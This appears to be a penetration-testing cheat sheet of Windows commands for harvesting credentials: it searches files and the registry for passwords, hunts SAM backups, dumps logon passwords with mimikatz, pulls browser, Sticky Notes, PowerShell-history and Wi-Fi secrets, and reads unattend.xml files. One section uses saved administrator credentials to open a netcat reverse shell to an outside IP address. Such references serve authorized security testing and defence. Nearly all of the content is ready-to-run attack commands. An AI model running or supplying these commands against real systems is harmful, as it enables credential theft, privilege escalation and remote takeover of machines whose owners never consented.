---
legal-banner: true
---

### **File searching commands**

1.  Search for potentially risky files in the current directory and subdirectories:  
    `dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* == *user*`
    
2.  Search for cleartext credentials in XML files:  
    `gci * -Include *.xml -Recurse -EA SilentlyContinue | select-string cpassword`
    
3.  Search for IIS web.config files:  
    `Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue`
    
4.  Find files containing the word "password" across common configuration file types:  
    `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.bat *.zip`
    
5.  Hunt for SAM and SYSTEM backups:  
    `cd C: & dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD == SAM.BAK == SYSTEM.BAK`
    
6.  Use **winPEAS** to search for credential files:  
    `.\winPEASany.exe quiet cmd searchfast filesinfo`

### **Searching for credentials in the registry**

1.  Search for passwords in `HKLM`:  
    `reg query HKLM /f password /t REG_SZ /s`
2.  Search for passwords in `HKCU`:  
    `reg query HKCU /f password /t REG_SZ /s`
3.  Retrieve PuTTY credentials:  
    `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions /f "Proxy" /s`

### **Saved Windows credentials**

Windows allows saving credentials for reuse. These commands help enumerate and leverage them:

1.  Identify saved credentials with **winPEAS**:  
    `.\winPEASx64.exe quiet cmd windowscreds`
2.  Check AutoLogon credentials in the registry:  
    `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"`
3.  Extract plaintext passwords from memory with mimikatz:  
    `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"`
4.  Manually list saved credentials:  
    `cmdkey /list`
5.  Run commands with saved credentials:  
    `runas /savecred /user:admin cmd.exe`
6.  Start a Netcat listener:  
    `nc -lvnp 1337`
7.  Use saved credentials to trigger a reverse shell:  
    `runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\administrator "c:\temp\nc.exe [IP-ADDRESS] 1337 -e cmd.exe"`

### **PowerShell history file**

1.  Locate the PowerShell history file:  
    `(Get-PSReadLineOption).HistorySavePath`
2.  Read contents of the history file:  
    `gc (Get-PSReadLineOption).HistorySavePath`
3.  Retrieve history for all users:  
    `foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}`

### **Browser credentials**

1.  Extract browser credentials with LaZagne:  
    `lazagne.exe browsers`
2.  Example: Search Chrome dictionary file for "password":  
    `gc 'C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password`

### **PowerShell credentials**

1.  Import credentials from XML:  
    `$credential = Import-Clixml -Path 'C:\scripts\pass.xml'`
2.  Retrieve username:  
    `$credential.GetNetworkCredential().Username`
3.  Retrieve password:  
    `$credential.GetNetworkCredential().Password`
4.  Full example:  

    ```powershell
    $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
    $username = $credential.GetNetworkCredential().Username
    $password = $credential.GetNetworkCredential().Password
    "Username: $username"
    "Password: $password"
    ```

### **Sticky Notes passwords**

1.  Locate Sticky Notes database:  
    `ls C:\Users\[USER]\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState`
2.  Allow PowerShell execution in current process:  
    `Set-ExecutionPolicy Bypass -Scope Process`
3.  Navigate to the PSSQLite module directory:  
    `cd .\PSSQLite\`
4.  Import the PSSQLite module:  
    `Import-Module .\PSSQLite.psd1`
5.  Define the database path:  
    `$db = 'C:\Users\[USER]\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'`
6.  Query the database:  
    `Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | Format-Table -Wrap`
7.  Alternative: dump contents with `strings`:  
    `strings 'C:\Users\[USER]\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite-wal'`

### **Wi-Fi passwords**

1.  List saved wireless networks:  
    `netsh wlan show profile`
2.  Retrieve password for a profile:  
    `netsh wlan show profile [PROFILE-NAME] key=clear`
3.  One-liner to extract all saved Wi-Fi passwords:  
    `cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on`

### **Unattend.xml**

Windows Deployment Services often leave unattended installation files containing admin credentials.

#### **Manually check common locations**

- `C:\Unattend.xml`  
- `C:\Windows\Panther\Unattend.xml`  
- `C:\Windows\Panther\Unattend\Unattend.xml`  
- `C:\Windows\System32\sysprep.inf`  
- `C:\Windows\System32\sysprep\sysprep.xml`

#### **Automatically search**

1.  Find unattended/sysprep files:  
    `Get-ChildItem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue`
2.  Search for specific filenames:  
    `dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul`
3.  Search for "password" in all files:  
    `findstr /spin "password" *.*`
4.  Example from `Unattend.xml`:  

    ```xml
    <AutoLogon>
        <Password>
            <Value>HackFast_p@ss</Value>
            <PlainText>true</PlainText>
        </Password>
        <Enabled>true</Enabled>
        <LogonCount>2</LogonCount>
        <Username>Administrator</Username>
    </AutoLogon>
    ```